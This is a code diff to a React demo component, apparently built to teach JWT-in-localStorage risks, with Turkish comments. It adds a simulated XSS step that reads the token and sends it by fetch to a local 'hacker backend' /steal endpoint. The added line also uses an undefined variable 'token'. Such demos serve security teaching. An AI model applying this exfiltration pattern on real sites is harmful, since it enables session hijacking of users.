@@ -23,12 +23,21 @@ export function JwtVulnerable() {
   };
 
   // Simüle edilmiş XSS Saldırısı (LocalStorage okunur)
-  const simulateXssAttack = () => {
+  const simulateXssAttack= async () => {
     // Saldırganın injection yoluyla çalıştırdığı kod:
     const leakedToken = localStorage.getItem('jwt_token');
     if (leakedToken) {
       setStolenToken(leakedToken);
       setStatusMessage('XSS Saldırısı Başarılı: LocalStorage içindeki JWT çalındı!');
+
+     //Hacker Backend'e (Port 4000) Veriyi Gönder
+    try {
+       await fetch(`http://localhost:4000/steal?token=${encodeURIComponent(token)}`);
+       console.log("Token başarıyla hacker-backend'e iletildi.");
+    } catch (error) {
+      console.error("Hacker backend'e istek atılamadı (Sunucu kapalı olabilir):", error);
+    }
+    
     } else {
       setStatusMessage('Saldırı başarısız: LocalStorage içinde token bulunamadı.');
     }
@@ -90,6 +99,7 @@ export function JwtVulnerable() {
           <strong>XSS İle Çalınan Veri:</strong>
           <div style={{ fontFamily: 'monospace', wordBreak: 'break-all', marginTop: '4px', color: '#374151' }}>
             {stolenToken}
+            
           </div>
         </div>
       )}
